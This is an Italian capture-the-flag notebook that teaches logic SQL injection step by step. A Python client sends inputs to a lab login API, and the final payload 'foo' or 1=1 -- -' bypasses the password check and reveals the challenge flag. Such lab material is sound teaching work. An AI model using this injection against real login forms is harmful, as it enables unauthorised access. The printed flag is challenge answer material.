# Logic SQL injection

In questa challenge tratteremo la tipologia di SQL injection più semplice. Imparerai a iniettare espressioni booleane in una query in modo da modificare il flusso di esecuzione di un programma vulnerabile.

Sul lato destro della pagina troverai una casella di testo (che qui abbiamo sostituito con l'esecuzione del codice Python) che ti permetterà di inviare un input che sarà inserito in una query SQL senza meccanismi di sanitizzazione.

Una volta inviato, potrai visualizzare il testo della query effettivamente eseguita, il tempo di risposta e, se la query ha avuto successo, la risposta fornita dal server, o il messaggio di errore generato nel caso in cui la query risultasse invalida.

In [2]:
import requests

class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = "{}/api/".format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + "get_token").json()
        self.token = resp["token"]

    def _do_raw_req(self, url, query):
        headers = {"X-CSRFToken": self.token}
        data = {"query": query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + "logic"
        return self._do_raw_req(url, query)

    def union(self, query):
        url = self.base_url + "union"
        return self._do_raw_req(url, query)

    def blind(self, query):
        url = self.base_url + "blind"
        return self._do_raw_req(url, query)

    def time(self, query):
        url = self.base_url + "time"
        return self._do_raw_req(url, query)

# Inizializziamo l'oggetto con l'URL della challenge
target_url = "http://web-17.challs.olicyber.it"
injector = Inj(target_url)
print("Classe inizializzata con successo!")

Classe inizializzata con successo!


In [3]:
def print_report(payload, response):
    """Funzione di utilità per stampare i risultati dell'API in modo leggibile."""
    print("="*60)
    print(f"[*] INPUT INVIATO:  {payload}")
    print(f"[*] QUERY ESEGUITA: {response.get('query', 'N/D')}")
    print(f"[*] RISULTATO:      {response.get('result', 'N/D')}")
    
    if response.get('sql_error'):
        print("\n[!] ERRORE SQL RILEVATO:")
        print(response['sql_error'])
    print("="*60 + "\n")

## 1. Inserimento di testo casuale
Prova ad inserire del testo casuale, ad esempio `foobar`, e osserva la query eseguita e la risposta.

Se hai inviato la stringa `foobar`, la query eseguita sarà stata
`SELECT * FROM login WHERE password = 'foobar'`
e il risultato Fail.

La query simula una procedura di accesso in cui la password è inserita direttamente nella query che realizza il confronto della credenziale fornita con quelle memorizzate nel database degli utenti. L'obiettivo è far sì che la query ritorni almeno un risultato, in modo da ingannare il sistema a pensare che la stringa inviata sia una password esistente.

In [4]:
payload_1 = "foobar"
response_1 = injector.logic(payload_1)
print_report(payload_1, response_1)

[*] INPUT INVIATO:  foobar
[*] QUERY ESEGUITA: SELECT * FROM login WHERE password = 'foobar'
[*] RISULTATO:      Fail



## 2. Causare un errore SQL
Per prima cosa dobbiamo provare a terminare la stringa delimitata da apicetti ('), in modo che il resto dell'input fornito sia interpretato come codice SQL. Per fare ciò ci basta inviare un'input contenente il carattere `'`.

Prova ad inviare la stringa `foo' bar` e osserva cosa succede.

La stringa `foo' bar`, se inviata, causa l'errore:
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'bar '' at line 1`

E la query eseguita sarà stata:
`SELECT * FROM login WHERE password = 'foo' bar '`

È possibile notare che la query è malformata: dopo foo il database incontra `'`, che termina la strainga. Il resto dell'input, a questo punto, deve essere un pezzo di SQL valido nel contesto in cui si trova, e il token `bar` non lo è.

In [5]:
payload_2 = "foo' bar"
response_2 = injector.logic(payload_2)
print_report(payload_2, response_2)

[*] INPUT INVIATO:  foo' bar
[*] QUERY ESEGUITA: SELECT * FROM login WHERE password = 'foo' bar'
[*] RISULTATO:      Fail

[!] ERRORE SQL RILEVATO:
(pymysql.err.ProgrammingError) (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'bar'' at line 1")
[SQL: SELECT * FROM login WHERE password = 'foo' bar']
(Background on this error at: https://sqlalche.me/e/14/f405)



## 3. Costruire l'injection finale e bypassare il login
Proviamo ora a rendere la query sintatticamente valida iniettando un pezzo di SQL che, in aggiunta, renda l'esito di `password = 'foo'` sempre positivo. Il modo più semplice è far seguire alla stringa l'operatore booleano OR, e un'altra operazione di confronto che risulti sempre vera, come `1=1`. Il nostro input diventa:
`password = 'foo' or 1=1`

Essendo `1=1` sempre vero, e `password = 'foo'` (probabilmente) falso, avremo generalmente una situazione del tipo falso OR vero, che è vero per qualunque stringa si trovi al posto di foo.

Siamo molto vicini ad arrivare a una query valida, ma dobbiamo risolvere un ultimo problema. Dopo il nostro input, nella query è inserito automaticamente un ulteriore apicetto (`'`) per concludere quella che sarebbe dovuta essere la stringa da confrontare. La stringa però l'abbiamo già conclusa noi, quindi ora nella query ci sono tre apicetti, una situazione invalida. In generale quando non abbiamo accesso al testo della query non abbiamo modo di sapere cosa venga inserito dopo il nostro input e che potrebbe generare un crash, perciò il metodo più affidabile per concludere la nostra injection è aprire un commento (`-- -`). Questo istruirà il database ad ignorare il resto del codice presente dopo il punto di injection qualunque esso sia, permettendo alla nostra query di essere finalmente eseguita senza errori.

In [6]:
payload_final = "foo' or 1=1 -- -"
response_final = injector.logic(payload_final)
print_report(payload_final, response_final)

[*] INPUT INVIATO:  foo' or 1=1 -- -
[*] QUERY ESEGUITA: SELECT * FROM login WHERE password = 'foo' or 1=1 -- -'
[*] RISULTATO:      flag{1s_ths_h0w_l0g1ns_w0rk}

